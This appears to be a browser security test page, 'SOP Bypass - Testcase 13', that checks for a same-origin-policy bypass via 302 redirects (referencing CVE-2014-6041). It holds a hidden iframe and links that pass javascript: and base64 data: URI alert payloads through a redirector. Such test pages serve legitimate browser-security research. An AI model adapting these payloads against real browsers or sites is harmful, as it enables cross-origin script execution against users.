---
layout: default
title: SOP Bypass - Testcase 13
permalink: /sop/new/13
---

SOP Bypass test case based upon 302 server side redirects
<iframe height="0" width="0" name="CVE-2014-6041" src="https://web.archive.org/web/20180831120309if_/https://www.bing.com/" style="display:none;" data-ruffle-polyfilled=""></iframe>

<a href="https://web.archive.org/web/20180831120309/http://innerht.ml/re.php?xss=javascript:alert(document.domain)"><input type="button" id="btn_test" class="test" value="Run Test Case 1"></a>
<a href="https://web.archive.org/web/20180831120309/http://innerht.ml/re.php?xss=javascript:alert(document.domain)"><br></a>
<a href="https://web.archive.org/web/20180831120309/http://innerht.ml/re.php?xss=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ"><input type="button" id="btn_test" class="test" value="Run Test Case 2"></a>

<div class="note">
    <p><strong>Note:</strong><br>
    If page redirects and displays an alert box from the origin of innerht.ml, it has resulted in a SOP Bypass.
    </p>
</div>
